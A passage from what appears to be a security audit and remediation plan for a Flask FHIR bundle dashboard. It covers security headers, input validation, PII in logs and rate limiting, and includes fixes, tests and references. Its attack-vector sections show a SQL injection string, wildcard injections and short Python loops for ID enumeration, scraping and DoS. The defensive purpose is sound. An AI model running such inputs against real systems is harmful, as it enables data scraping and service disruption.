If you want to monitor CSP violations:

```python
# In CSP directives
if app.config.get('CSP_REPORT_URI'):
    csp_directives.append(f"report-uri {app.config['CSP_REPORT_URI']}")
```

### Testing Requirements

**Unit Tests:**

```python
# tests/test_security_headers.py
def test_security_headers_present_on_dashboard(client, auth_headers):
    response = client.get('/v2/bundle/dashboard', headers=auth_headers)

    assert response.headers.get('X-Frame-Options') == 'DENY'
    assert response.headers.get('X-Content-Type-Options') == 'nosniff'
    assert response.headers.get('X-XSS-Protection') == '1; mode=block'
    assert response.headers.get('Referrer-Policy') == 'strict-origin-when-cross-origin'
    assert 'Content-Security-Policy' in response.headers

def test_csp_allows_required_sources(client, auth_headers):
    response = client.get('/v2/bundle/dashboard', headers=auth_headers)
    csp = response.headers.get('Content-Security-Policy')

    assert 'cdn.jsdelivr.net' in csp
    assert 'cdnjs.cloudflare.com' in csp
    assert "frame-ancestors 'none'" in csp

def test_hsts_only_in_production(app):
    # In development (SESSION_COOKIE_SECURE=False)
    app.config['SESSION_COOKIE_SECURE'] = False
    with app.test_client() as client:
        response = client.get('/v2/bundle/dashboard')
        assert 'Strict-Transport-Security' not in response.headers

    # In production (SESSION_COOKIE_SECURE=True)
    app.config['SESSION_COOKIE_SECURE'] = True
    with app.test_client() as client:
        response = client.get('/v2/bundle/dashboard')
        assert 'Strict-Transport-Security' in response.headers

def test_security_headers_not_on_health_checks(client):
    response = client.get('/health/health')
    # Health checks don't need security headers
    assert 'X-Frame-Options' not in response.headers
```

**Manual Testing:**

```bash
# Test security headers with curl
curl -I https://your-app.com/v2/bundle/dashboard

# Expected output:
# X-Frame-Options: DENY
# X-Content-Type-Options: nosniff
# X-XSS-Protection: 1; mode=block
# Referrer-Policy: strict-origin-when-cross-origin
# Content-Security-Policy: default-src 'self'; ...
# Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

**Browser Testing:**

1. Open dashboard in browser
2. Open DevTools → Console
3. Verify no CSP violations
4. Try embedding dashboard in iframe (should be blocked)
5. Check Network tab for security headers

### Files to Modify

1. **MODIFY:** `app/app.py` - Add security headers handler
2. **MODIFY:** `app/settings.py` - Add security configuration
3. **MODIFY:** `.env.example` - Add security settings
4. **NEW:** `app/static/css/dashboard.css` - External CSS (optional)
5. **MODIFY:** `app/fhir/templates/base.html` - Link external CSS (optional)
6. **NEW:** `tests/test_security_headers.py` - Security header tests

### Verification Steps

1. Run tests: `flask test tests/test_security_headers.py`
2. Use online security header checker: [Security Headers](https://securityheaders.com)
3. Test with browser DevTools:
   - Check Response Headers in Network tab
   - Verify no CSP violations in Console
4. Test clickjacking protection:
   - Try embedding dashboard in iframe
   - Should be blocked by X-Frame-Options
5. Test in production environment with HTTPS

### References

- [OWASP Secure Headers Project](https://owasp.org/www-project-secure-headers/)
- [MDN: Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [MDN: X-Frame-Options](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options)
- [MDN: Strict-Transport-Security](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security)
- [Security Headers Checker](https://securityheaders.com/)
- [CSP Evaluator](https://csp-evaluator.withgoogle.com/)

---

## Issue 5: Insufficient Input Validation

### Severity: HIGH ⚠️

**OWASP:** A03:2025 Injection
**CWE:** CWE-20 (Improper Input Validation)

### Vulnerability Description

Search parameters lack comprehensive validation for length limits, character whitelisting, and SQL wildcard escaping. This creates risks for DoS attacks, wildcard injection, and database performance issues.

### Affected Code

**File:** `app/fhir/routes.py`
**Lines:** 238-244
**Function:** `bundle_dashboard_search()`

```python
# Current: No validation
bundle_id = request.args.get('bundle_id', '').strip()
status = request.args.get('status', '')
source = request.args.get('source', '')
date_from = request.args.get('date_from', '')
date_to = request.args.get('date_to', '')
organization = request.args.get('organization', '').strip()
```

**File:** `app/fhir/service.py`
**Lines:** 267, 289
**Function:** `FHIRService.search_bundles()`

```python
# ILIKE queries without wildcard escaping
query = query.filter(Bundle.bundle_id.ilike(f'%{bundle_id}%'))
query = query.filter(Screen.organization_name.ilike(f'%{organization}%'))
```

### Attack Vectors

Example 1: DoS via Large Input

```text
?bundle_id=AAAAAAA... (10MB of data)
```

Example 2: Wildcard Injection

```text
?bundle_id=%  # Matches everything, expensive query
?organization=_  # Matches any single character
```

Example 3: Date Format Injection

```text
?date_from=2024-13-45  # Invalid date, causes exception
?date_to='; DROP TABLE--  # SQL injection attempt
```

Example 4: Enum Value Injection

```text
?status=invalid_status  # Should be validated against enum
?source=malicious_source
```

### Root Cause

1. No length limits on text inputs
2. No validation of enum values (status, source)
3. No date format validation before parsing
4. SQL wildcards (`%`, `_`) not escaped in ILIKE queries
5. No sanitization of special characters

### Feasibility Analysis

**Complexity:** Medium
**Breaking Changes:** None (adds validation, doesn't change behavior)
**Dependencies:** None (standard library only)

**Challenges:**

1. Need to validate without breaking legitimate searches
2. Must provide user-friendly error messages
3. Date validation needs to handle multiple formats
4. Enum validation must match database values

### Implementation Plan

**Note:** This builds on the `validators.py` file created in Issue 1.

Step 1: Enhance Validation Module

Modify: `app/fhir/validators.py` (created in Issue 1)

Add additional validation functions:

```python
"""Input validation and sanitization for FHIR routes."""
import re
from datetime import datetime
from typing import Optional


def sanitize_regex_pattern(pattern: str) -> str:
    """Escape special regex characters for safe use in PostgreSQL regex.

    Args:
        pattern: User input to be used in regex

    Returns:
        Escaped pattern safe for regex use
    """
    return re.escape(pattern)


def validate_search_input(
    value: Optional[str],
    max_length: int = 100,
    field_name: str = 'input'
) -> Optional[str]:
    """Validate and sanitize search input.

    Args:
        value: Input value to validate
        max_length: Maximum allowed length
        field_name: Field name for error messages

    Returns:
        Sanitized value or None if empty

    Raises:
        ValueError: If validation fails
    """
    if not value:
        return None

    value = value.strip()

    # Length validation (prevent DoS)
    if len(value) > max_length:
        raise ValueError(
            f'{field_name} exceeds maximum length of {max_length} characters'
        )

    # Escape SQL wildcards to prevent wildcard injection in ILIKE
    value = value.replace('%', '\\%').replace('_', '\\_')

    return value


def validate_enum_value(
    value: Optional[str],
    allowed_values: set,
    field_name: str = 'field'
) -> Optional[str]:
    """Validate that value is in allowed set.

    Args:
        value: Value to validate
        allowed_values: Set of allowed values
        field_name: Field name for error messages

    Returns:
        Validated value or None if empty

    Raises:
        ValueError: If value not in allowed set
    """
    if not value:
        return None

    if value not in allowed_values:
        raise ValueError(
            f'Invalid {field_name}: {value}. '
            f'Allowed values: {", ".join(sorted(allowed_values))}'
        )

    return value


def validate_date_string(
    value: Optional[str],
    field_name: str = 'date'
) -> Optional[str]:
    """Validate date string format (YYYY-MM-DD).

    Args:
        value: Date string to validate
        field_name: Field name for error messages

    Returns:
        Validated date string or None if empty

    Raises:
        ValueError: If date format is invalid
    """
    if not value:
        return None

    try:
        # Validate format and actual date
        datetime.strptime(value, '%Y-%m-%d')
        return value
    except ValueError as e:
        raise ValueError(
            f'Invalid {field_name} format: {value}. '
            f'Expected YYYY-MM-DD format. Error: {str(e)}'
        )


def validate_pagination_params(
    page: int,
    per_page: int,
    max_per_page: int = 100
) -> tuple[int, int]:
    """Validate pagination parameters.

    Args:
        page: Page number (1-indexed)
        per_page: Results per page
        max_per_page: Maximum allowed per_page value

    Returns:
        Tuple of (validated_page, validated_per_page)

    Raises:
        ValueError: If parameters are invalid
    """
    if page < 1:
        raise ValueError('Page number must be >= 1')

    if per_page < 1:
        raise ValueError('Results per page must be >= 1')

    if per_page > max_per_page:
        raise ValueError(
            f'Results per page cannot exceed {max_per_page}'
        )

    return page, per_page
```

Step 2: Update Route Handler with Comprehensive Validation

Modify: `app/fhir/routes.py` in `bundle_dashboard_search()` function

```python
from app.fhir.validators import (
    validate_search_input,
    validate_enum_value,
    validate_date_string,
    validate_pagination_params
)

@fhir_bp.route('/bundle/dashboard', methods=['GET'], strict_slashes=False)
@login_required
@limiter.limit('100 per minute')  # Added in Issue 7
def bundle_dashboard_search():
    """Bundle search page with filters."""
    from flask import render_template
    from app.fhir.service import FHIRService

    try:
        # Validate text inputs
        bundle_id = validate_search_input(
            request.args.get('bundle_id', '').strip(),
            max_length=100,
            field_name='Bundle ID'
        )

        organization = validate_search_input(
            request.args.get('organization', '').strip(),
            max_length=200,
            field_name='Organization'
        )

        # Validate enum values
        status = validate_enum_value(
            request.args.get('status', ''),
            allowed_values={'pending', 'processed', 'failed'},
            field_name='status'
        )

        source = validate_enum_value(
            request.args.get('source', ''),
            allowed_values={'external', 'self_screen'},
            field_name='source'
        )

        # Validate dates
        date_from = validate_date_string(
            request.args.get('date_from', ''),
            field_name='date_from'
        )

        date_to = validate_date_string(
            request.args.get('date_to', ''),
            field_name='date_to'
        )

        # Validate pagination
        page, per_page = validate_pagination_params(
            page=int(request.args.get('page', 1)),
            per_page=int(request.args.get('per_page', 50)),
            max_per_page=100
        )

    except ValueError as e:
        # Return user-friendly error
        current_app.logger.warning(f'Invalid search parameters: {e}')
        return render_template(
            'error.html',
            error_message=f'Invalid search parameters: {str(e)}',
            error_code=400
        ), 400
    except (TypeError, ValueError) as e:
        # Handle pagination conversion errors
        current_app.logger.warning(f'Invalid pagination parameters: {e}')
        return render_template(
            'error.html',
            error_message='Invalid page or per_page parameter',
            error_code=400
        ), 400

    offset = (page - 1) * per_page

    # Search with validated parameters
    bundles, total_count = FHIRService.search_bundles(
        bundle_id=bundle_id,
        status=status,
        source=source,
        date_from=date_from,
        date_to=date_to,
        organization=organization,
        limit=per_page,
        offset=offset
    )

    total_pages = (total_count + per_page - 1) // per_page if total_count > 0 else 0

    return render_template(
        'search.html',
        bundles=bundles,
        total_count=total_count,
        page=page,
        per_page=per_page,
        total_pages=total_pages,
        search_params={
            'bundle_id': bundle_id or '',
            'status': status or '',
            'source': source or '',
            'date_from': date_from or '',
            'date_to': date_to or '',
            'organization': organization or '',
        },
        user=g.get('user')
    )
```

Step 3: Add Client-Side Validation (Defense in Depth)

Modify: `app/fhir/templates/search.html`

Add HTML5 validation attributes:

```html
<form method="GET" action="/v2/bundle/dashboard">
    <input type="hidden" name="csrf_token" value="{{ csrf_token() }}"/>
    <div class="row g-3">
        <div class="col-md-6">
            <label for="bundle_id" class="form-label">Bundle ID</label>
            <input type="text" class="form-control" id="bundle_id" name="bundle_id"
                   value="{{ search_params.bundle_id }}"
                   placeholder="Enter bundle ID"
                   maxlength="100">
            <small class="form-text text-muted">Primary search field (max 100 characters)</small>
        </div>

        <!-- Status and Source dropdowns are already constrained -->

        <div class="col-md-3">
            <label for="date_from" class="form-label">Date From</label>
            <input type="date" class="form-control" id="date_from" name="date_from"
                   value="{{ search_params.date_from }}"
                   max="{{ today }}">
        </div>

        <div class="col-md-3">
            <label for="date_to" class="form-label">Date To</label>
            <input type="date" class="form-control" id="date_to" name="date_to"
                   value="{{ search_params.date_to }}"
                   max="{{ today }}">
        </div>

        <div class="col-md-6">
            <label for="organization" class="form-label">Organization</label>
            <input type="text" class="form-control" id="organization" name="organization"
                   value="{{ search_params.organization }}"
                   placeholder="Organization name or identifier"
                   maxlength="200">
            <small class="form-text text-muted">Max 200 characters</small>
        </div>

        <!-- Submit buttons -->
    </div>
</form>
```

Pass today's date to template in route handler:

```python
from datetime import date

return render_template(
    'search.html',
    # ... other params ...
    today=date.today().isoformat()
)
```

### Testing Requirements

**Unit Tests:**

```python
# tests/fhir/test_validators.py
def test_validate_search_input_rejects_long_input():
    with pytest.raises(ValueError, match='exceeds maximum length'):
        validate_search_input('a' * 101, max_length=100)

def test_validate_search_input_escapes_wildcards():
    result = validate_search_input('test%_value')
    assert result == 'test\\%\\_value'

def test_validate_enum_value_rejects_invalid():
    with pytest.raises(ValueError, match='Invalid status'):
        validate_enum_value('invalid', {'valid1', 'valid2'}, 'status')

def test_validate_date_string_rejects_invalid_format():
    with pytest.raises(ValueError, match='Invalid date format'):
        validate_date_string('2024-13-45')

def test_validate_pagination_params_rejects_negative():
    with pytest.raises(ValueError):
        validate_pagination_params(page=-1, per_page=50)

def test_validate_pagination_params_enforces_max():
    with pytest.raises(ValueError, match='cannot exceed'):
        validate_pagination_params(page=1, per_page=200, max_per_page=100)
```

**Integration Tests:**

```python
# tests/fhir/test_search_validation.py
def test_search_rejects_oversized_bundle_id(client, auth_headers):
    response = client.get(
        f'/v2/bundle/dashboard?bundle_id={"a" * 101}',
        headers=auth_headers
    )
    assert response.status_code == 400
    assert b'exceeds maximum length' in response.data

def test_search_rejects_invalid_status(client, auth_headers):
    response = client.get(
        '/v2/bundle/dashboard?status=invalid',
        headers=auth_headers
    )
    assert response.status_code == 400
    assert b'Invalid status' in response.data

def test_search_rejects_invalid_date(client, auth_headers):
    response = client.get(
        '/v2/bundle/dashboard?date_from=2024-13-45',
        headers=auth_headers
    )
    assert response.status_code == 400
    assert b'Invalid date' in response.data

def test_search_escapes_sql_wildcards(client, auth_headers, db_session):
    # Create bundle with specific ID
    bundle = Bundle(
        fingerprint='test-wildcard',
        bundle_id='test-123',
        source='external',
        status='processed',
        bundle_data={'resourceType': 'Bundle'}
    )
    db_session.add(bundle)
    db_session.commit()

    # Search with wildcard should not match everything
    response = client.get(
        '/v2/bundle/dashboard?bundle_id=%',
        headers=auth_headers
    )
    assert response.status_code == 200
    # Should escape % and not match all bundles
```

### Files to Modify

1. **MODIFY:** `app/fhir/validators.py` - Add validation functions
2. **MODIFY:** `app/fhir/routes.py` - Add comprehensive validation
3. **MODIFY:** `app/fhir/templates/search.html` - Add HTML5 validation
4. **MODIFY:** `tests/fhir/test_validators.py` - Add validation tests
5. **NEW:** `tests/fhir/test_search_validation.py` - Integration tests

### Verification Steps

1. Run unit tests: `flask test tests/fhir/test_validators.py`
2. Run integration tests: `flask test tests/fhir/test_search_validation.py`
3. Manual testing:
   - Try oversized inputs (>100 chars for bundle_id)
   - Try invalid enum values
   - Try invalid dates
   - Try SQL wildcards (`%`, `_`)
   - Try negative page numbers
   - Try excessive per_page values
4. Verify error messages are user-friendly
5. Verify legitimate searches still work

### References

- [OWASP Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)
- [CWE-20: Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)
- [PostgreSQL LIKE/ILIKE Documentation](https://www.postgresql.org/docs/current/functions-matching.html)
- [HTML5 Input Validation](https://developer.mozilla.org/en-US/docs/Learn/Forms/Form_validation)

---

## Issue 6: PII Exposure in Logs

### Severity: HIGH ⚠️

**OWASP:** Privacy Violation
**Compliance:** GDPR, HIPAA, CCPA

### Vulnerability Description

User identifiers (user_id, email addresses) are logged in authentication error messages, potentially violating privacy regulations and creating security risks if logs are compromised.

### Affected Code

**File:** `app/auth_routes.py`
**Lines:** 71, 119-122

```python
# Line 71: User ID in timeout log
current_app.logger.error(f'Timeout fetching account roles for user {user_id}')

# Lines 119-122: Email and roles in authorization failure log
current_app.logger.warning(
    f"User {userinfo.get('email')} attempted dashboard access without required role. "
    f'User roles: {account_roles}, Required: {DASHBOARD_ALLOWED_ROLES}'
)
```

### Privacy Risks

1. **GDPR Violation:** Logging personal data without proper safeguards
2. **HIPAA Concern:** User identifiers may be linked to PHI
3. **Security Risk:** Compromised logs expose user identities
4. **Audit Trail:** Difficult to anonymize logs for analysis

### Root Cause

Direct logging of user identifiers without hashing or redaction. While commit `f3036109` removed PII from operational logs, these authentication-specific logs were missed.

### Feasibility Analysis

**Complexity:** Low
**Breaking Changes:** None
**Dependencies:** Standard library only (`hashlib`)

**Challenges:**

1. Need to maintain debuggability
2. Must be consistent across all log statements
3. Should allow correlation of events for same user

### Implementation Plan

Step 1: Create Logging Utility

Create new file: `app/logging_utils.py`

```python
"""Logging utilities for privacy-safe logging."""
import hashlib
from typing import Any, Optional


def hash_identifier(value: Any, prefix: str = '') -> str:
    """Create a non-reversible hash for logging identifiers.

    Args:
        value: The identifier to hash (user_id, email, etc.)
        prefix: Optional prefix for the hash (e.g., 'user', 'email')

    Returns:
        Hashed identifier safe for logging

    Example:
        >>> hash_identifier('user@example.com', 'email')
        'email:a1b2c3d4e5f6'
    """
    if value is None:
        return f'{prefix}:none' if prefix else 'none'

    # Create SHA-256 hash
    hash_obj = hashlib.sha256(str(value).encode('utf-8'))
    # Use first 12 characters for brevity while maintaining uniqueness
    short_hash = hash_obj.hexdigest()[:12]

    return f'{prefix}:{short_hash}' if prefix else short_hash


def sanitize_log_data(data: dict) -> dict:
    """Sanitize dictionary for safe logging by hashing PII fields.

    Args:
        data: Dictionary potentially containing PII

    Returns:
        Sanitized dictionary with hashed identifiers
    """
    pii_fields = {'email', 'user_id', 'sub', 'username', 'name'}
    sanitized = {}

    for key, value in data.items():
        if key in pii_fields:
            sanitized[f'{key}_hash'] = hash_identifier(value, key)
        else:
            sanitized[key] = value

    return sanitized
```

Step 2: Update Authentication Logs

Modify: `app/auth_routes.py`

Add import:

```python
from app.logging_utils import hash_identifier, sanitize_log_data
```

Update line 71 (in `_fetch_account_roles`):

```python
# Before:
current_app.logger.error(f'Timeout fetching account roles for user {user_id}')

# After:
current_app.logger.error(
    f'Timeout fetching account roles for user {hash_identifier(user_id, "user")}'
)
```

Update line 74 (in `_fetch_account_roles`):

```python
# Before:
current_app.logger.error(f'Network error fetching account roles: {e}')

# After:
current_app.logger.error(
    f'Network error fetching account roles for user {hash_identifier(user_id, "user")}: {e}'
)
```

Update lines 119-122 (in `callback`):

```python
# Before:
current_app.logger.warning(
    f"User {userinfo.get('email')} attempted dashboard access without required role. "
    f'User roles: {account_roles}, Required: {DASHBOARD_ALLOWED_ROLES}'
)

# After:
current_app.logger.warning(
    f'User {hash_identifier(userinfo.get("email"), "email")} '
    f'attempted dashboard access without required role. '
    f'User roles: {account_roles}, Required: {DASHBOARD_ALLOWED_ROLES}'
)
```

Update line 133 (successful login):

```python
# Before:
current_app.logger.info('User logged in successfully')

# After:
current_app.logger.info(
    f'User {hash_identifier(userinfo.get("email"), "email")} logged in successfully'
)
```

Update line 155 (logout):

```python
# Before:
current_app.logger.info('User logged out')

# After:
# Get user from session before clearing
user_hash = hash_identifier(session.get('user', {}).get('email'), 'email')
session.clear()
current_app.logger.info(f'User {user_hash} logged out')
```

Update line 169 (unauthenticated access):

```python
# Before:
current_app.logger.warning(f'Unauthenticated access attempt to {request.path}')

# After:
current_app.logger.warning(
    f'Unauthenticated access attempt to {request.path} from {request.remote_addr}'
)
```

Step 3: Add Configuration for Log Sanitization

Modify: `app/settings.py`

```python
class Config:
    # ... existing config ...

    # Logging Configuration
    LOG_SANITIZE_PII = os.getenv('LOG_SANITIZE_PII', 'True').lower() == 'true'
    LOG_HASH_LENGTH = int(os.getenv('LOG_HASH_LENGTH', 12))
```

Modify: `.env.example`

```bash
# Logging Configuration
LOG_SANITIZE_PII=True
LOG_HASH_LENGTH=12  # Length of hashed identifiers in logs
```

Step 4: Document Logging Policy

Create: `docs/logging-policy.md`

```markdown
# Logging Policy

## PII Handling

All personally identifiable information (PII) must be hashed before logging:

- User IDs
- Email addresses
- Usernames
- Full names

## Hashing Function

Use `hash_identifier()` from `app.logging_utils`:

```python
from app.logging_utils import hash_identifier

# Hash user email
logger.info(f'User {hash_identifier(user_email, "email")} performed action')
```

## Allowed in Logs

✅ Hashed identifiers
✅ Roles and permissions
✅ Timestamps
✅ IP addresses (for security events)
✅ Resource IDs (bundle_id, screen_id)
✅ Error messages (without PII)

## Prohibited in Logs

❌ Email addresses
❌ User IDs (unhashed)
❌ Full names
❌ Phone numbers
❌ PHI/PII from bundle data
❌ OAuth tokens
❌ Session IDs

## Compliance

This policy supports:

- GDPR Article 32 (Security of Processing)
- HIPAA Security Rule (§164.312)
- CCPA (California Consumer Privacy Act)

```markdown

### Testing Requirements

**Unit Tests:**
```python
# tests/test_logging_utils.py
def test_hash_identifier_consistent():
    """Verify same input produces same hash."""
    hash1 = hash_identifier('user@example.com', 'email')
    hash2 = hash_identifier('user@example.com', 'email')
    assert hash1 == hash2

def test_hash_identifier_unique():
    """Verify different inputs produce different hashes."""
    hash1 = hash_identifier('user1@example.com', 'email')
    hash2 = hash_identifier('user2@example.com', 'email')
    assert hash1 != hash2

def test_hash_identifier_non_reversible():
    """Verify hash cannot be reversed to original."""
    original = 'sensitive@example.com'
    hashed = hash_identifier(original, 'email')
    assert original not in hashed
    assert '@' not in hashed

def test_sanitize_log_data_hashes_pii():
    """Verify PII fields are hashed."""
    data = {
        'email': 'user@example.com',
        'user_id': '12345',
        'role': 'admin',
        'timestamp': '2024-01-01'
    }
    sanitized = sanitize_log_data(data)

    assert 'email' not in sanitized
    assert 'email_hash' in sanitized
    assert 'user_id' not in sanitized
    assert 'user_id_hash' in sanitized
    assert sanitized['role'] == 'admin'  # Non-PII preserved
```

**Integration Tests:**

```python
# tests/auth/test_auth_logging.py
def test_failed_login_logs_no_pii(client, caplog):
    """Verify failed login doesn't log email addresses."""
    # Attempt login that will fail role check
    # ... trigger authentication ...

    # Check logs don't contain email
    for record in caplog.records:
        assert '@' not in record.message
        assert 'email:' in record.message  # But hash prefix is present

def test_successful_login_logs_hashed_identifier(client, caplog):
    """Verify successful login logs hashed identifier."""
    # ... trigger successful authentication ...

    # Find login log entry
    login_logs = [r for r in caplog.records if 'logged in successfully' in r.message]
    assert len(login_logs) == 1
    assert 'email:' in login_logs[0].message
    assert '@' not in login_logs[0].message
```

### Files to Modify

1. **NEW:** `app/logging_utils.py` - Logging utilities
2. **MODIFY:** `app/auth_routes.py` - Update all log statements
3. **MODIFY:** `app/settings.py` - Add logging configuration
4. **MODIFY:** `.env.example` - Add logging settings
5. **NEW:** `docs/logging-policy.md` - Document policy
6. **NEW:** `tests/test_logging_utils.py` - Unit tests
7. **NEW:** `tests/auth/test_auth_logging.py` - Integration tests

### Verification Steps

1. Run tests: `flask test tests/test_logging_utils.py tests/auth/test_auth_logging.py`
2. Manual testing:
   - Trigger authentication failure
   - Check logs for hashed identifiers
   - Verify no email addresses in logs
   - Verify hashes are consistent for same user
3. Log analysis:
   - Search logs for `@` symbols (should only be in non-PII contexts)
   - Search for `email:` prefix (should be present)
   - Verify correlation of events for same user via hash
4. Compliance review:
   - Review with legal/compliance team
   - Document in privacy policy
   - Update data retention policies

### References

- [GDPR Article 32: Security of Processing](https://gdpr-info.eu/art-32-gdpr/)
- [HIPAA Security Rule](https://www.hhs.gov/hipaa/for-professionals/security/index.html)
- [OWASP Logging Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html)
- [NIST SP 800-122: Guide to Protecting PII](https://csrc.nist.gov/publications/detail/sp/800-122/final)

---

## Issue 7: Missing Rate Limiting on Dashboard Routes

### Severity: HIGH ⚠️

**OWASP:** A04:2025 Insecure Design, API4:2023 Unrestricted Resource Consumption
**CWE:** CWE-770 (Allocation of Resources Without Limits)

### Vulnerability Description

Dashboard routes lack rate limiting, allowing attackers to:

- Enumerate bundle IDs through brute force
- Exhaust database resources with expensive queries
- Scrape all bundle data
- Perform DoS attacks

### Affected Code

**File:** `app/fhir/routes.py`

```python
# Line 234: No rate limiting
@fhir_bp.route('/bundle/dashboard', methods=['GET'], strict_slashes=False)
@login_required
def bundle_dashboard_search():
    # Expensive database query without rate limit

# Line 289: No rate limiting
@fhir_bp.route('/bundle/dashboard/<bundle_id>', methods=['GET'], strict_slashes=False)
@login_required
def bundle_dashboard_detail(bundle_id):
    # Detailed bundle lookup without rate limit

# Line 207: No rate limiting on unauthenticated endpoint
@fhir_bp.route('/bundle/<bundle_id>', methods=['GET'])
def get_bundle_details(bundle_id):
    # Public API endpoint without rate limit
```

**Current Rate Limiting:**

- ✅ `/v2/auth/login` - 10 per minute
- ✅ `/v2/auth/callback` - 20 per minute
- ❌ `/v2/bundle/dashboard` - None
- ❌ `/v2/bundle/dashboard/<id>` - None
- ❌ `/v2/bundle/<id>` - None

### Attack Vectors

Example 1: Bundle ID Enumeration

```python
# Brute force bundle IDs
for i in range(10000):
    requests.get(f'https://app.com/v2/bundle/dashboard/{i}')
```

Example 2: Database DoS

```python
# Expensive wildcard searches
while True:
    requests.get('https://app.com/v2/bundle/dashboard?organization=%')
```

Example 3: Data Scraping

```python
# Scrape all bundles via pagination
for page in range(1, 10000):
    requests.get(f'https://app.com/v2/bundle/dashboard?page={page}')
```

### Root Cause

1. Flask-Limiter configured but not applied to dashboard routes
2. No per-user rate limiting (only per-IP)
3. No cost-based rate limiting for expensive queries

### Feasibility Analysis

**Complexity:** Low
**Breaking Changes:** None (legitimate users won't hit limits)
**Dependencies:** Flask-Limiter (already installed)

**Challenges:**

1. Need different limits for different endpoints
2. Must not impact legitimate users
3. Should consider authenticated vs. unauthenticated
4. Need to handle rate limit errors gracefully

### Implementation Plan

Step 1: Apply Rate Limiting to Dashboard Routes

Modify: `app/fhir/routes.py`

Add rate limiting decorators:

```python
from app.extensions import limiter

# Search endpoint - moderate limit (expensive queries)
@fhir_bp.route('/bundle/dashboard', methods=['GET'], strict_slashes=False)
@login_required
@limiter.limit('100 per minute')  # 100 searches per minute per user
@limiter.limit('1000 per hour')   # 1000 searches per hour per user
def bundle_dashboard_search():
    """Bundle search page with filters."""
    # ... existing code ...

# Detail endpoint - higher limit (cheaper queries)
@fhir_bp.route('/bundle/dashboard/<bundle_id>', methods=['GET'], strict_slashes=False)
@login_required
@limiter.limit('200 per minute')  # 200 detail views per minute
@limiter.limit('2000 per hour')   # 2000 detail views per hour
def bundle_dashboard_detail(bundle_id):
    """Bundle detail page."""
    # ... existing code ...

# Public API endpoint - stricter limit (unauthenticated)
@fhir_bp.route('/bundle/<bundle_id>', methods=['GET'])
@limiter.limit('50 per minute')   # Stricter for unauthenticated
@limiter.limit('500 per hour')
def get_bundle_details(bundle_id):
    """Get diagnostic information about a FHIR bundle."""
    # ... existing code ...
```

Step 2: Configure Per-User Rate Limiting

Modify: `app/extensions.py`

Update limiter configuration to use user ID when available:

```python
from flask import session

def get_rate_limit_key():
    """Get rate limit key based on user or IP address.

    Uses user ID from session if authenticated, otherwise falls back to IP.
    This prevents authenticated users from bypassing limits by changing IPs.
    """
    user = session.get('user')
    if user and user.get('id'):
        return f"user:{user['id']}"
    return get_remote_address()

# Update limiter initialization
limiter = Limiter(
    key_func=get_rate_limit_key,
    default_limits=['200 per day', '50 per hour'],
    storage_uri='memory://',  # Will be configured per environment
)
```

Step 3: Add Rate Limit Error Handler

Modify: `app/app.py`

Add error handler for rate limit exceeded:

```python
from flask_limiter.errors import RateLimitExceeded

@app.errorhandler(RateLimitExceeded)
def handle_rate_limit_exceeded(e):
    """Handle rate limit exceeded errors."""
    current_app.logger.warning(
        f'Rate limit exceeded for {request.path} from {request.remote_addr}'
    )

    # For dashboard pages, show user-friendly error
    if request.path.startswith('/v2/bundle/dashboard'):
        return render_template(
            'error.html',
            error_message='Too many requests. Please slow down and try again in a moment.',
            error_code=429
        ), 429

    # For API endpoints, return JSON
    return {
        'status': 'error',
        'message': 'Rate limit exceeded. Please try again later.',
        'retry_after': e.description
    }, 429
```

Step 4: Add Rate Limit Headers

Modify: `app/extensions.py`

Configure limiter to send rate limit headers:

```python
def init_limiter(app):
    """Initialize rate limiter with Redis storage."""
    # Use Redis for rate limiting (separate DB from jobs)
    redis_url = app.config.get('REDIS_JOBS_URL', 'redis://localhost:6379/0')
    # Use DB 2 for rate limiting to avoid conflicts
    storage_uri = redis_url.rsplit('/', 1)[0] + '/2'

    limiter.init_app(app)
    limiter.storage_uri = storage_uri

    # Enable rate limit headers
    app.config['RATELIMIT_HEADERS_ENABLED'] = True
    app.config['RATELIMIT_STORAGE_OPTIONS'] = {'socket_connect_timeout': 30}

    app.logger.info(f'Rate limiter initialized with storage: {storage_uri}')
```

Step 5: Configure Rate Limits

Modify: `app/settings.py`

```python
class Config:
    # ... existing config ...

    # Rate Limiting Configuration
    RATELIMIT_ENABLED = os.getenv('RATELIMIT_ENABLED', 'True').lower() == 'true'
    RATELIMIT_HEADERS_ENABLED = True
    RATELIMIT_STORAGE_URL = None  # Set by init_limiter()

    # Rate limit values (can be overridden per environment)
    RATELIMIT_DASHBOARD_SEARCH_PER_MINUTE = int(
        os.getenv('RATELIMIT_DASHBOARD_SEARCH_PER_MINUTE', 100)
    )
    RATELIMIT_DASHBOARD_DETAIL_PER_MINUTE = int(
        os.getenv('RATELIMIT_DASHBOARD_DETAIL_PER_MINUTE', 200)
    )
    RATELIMIT_API_PER_MINUTE = int(
        os.getenv('RATELIMIT_API_PER_MINUTE', 50)
    )
```

Modify: `.env.example`

```bash
# Rate Limiting
RATELIMIT_ENABLED=True
RATELIMIT_DASHBOARD_SEARCH_PER_MINUTE=100
RATELIMIT_DASHBOARD_DETAIL_PER_MINUTE=200
RATELIMIT_API_PER_MINUTE=50
```

Step 6: Add Monitoring

Create: `app/metrics.py` (if doesn't exist)

```python
"""Metrics for monitoring rate limiting."""
from datadog import statsd
from flask import current_app, request


def record_rate_limit_hit(endpoint: str):
    """Record rate limit hit for monitoring.

    Args:
        endpoint: The endpoint that was rate limited
    """
    if current_app.config['DD_ENV'] != 'local':
        statsd.increment(
            'rate_limit.exceeded',
            tags=[
                f'endpoint:{endpoint}',
                f'path:{request.path}',
            ]
        )
```

Update rate limit handler to record metrics:

```python
@app.errorhandler(RateLimitExceeded)
def handle_rate_limit_exceeded(e):
    """Handle rate limit exceeded errors."""
    from app.metrics import record_rate_limit_hit

    record_rate_limit_hit(request.endpoint or 'unknown')

    current_app.logger.warning(
        f'Rate limit exceeded for {request.path} from {request.remote_addr}'
    )
    # ... rest of handler ...
```

### Testing Requirements

**Unit Tests:**

```python
# tests/test_rate_limiting.py
def test_dashboard_search_rate_limit(client, auth_headers):
    """Verify search endpoint enforces rate limit."""
    # Make requests up to limit
    for i in range(100):
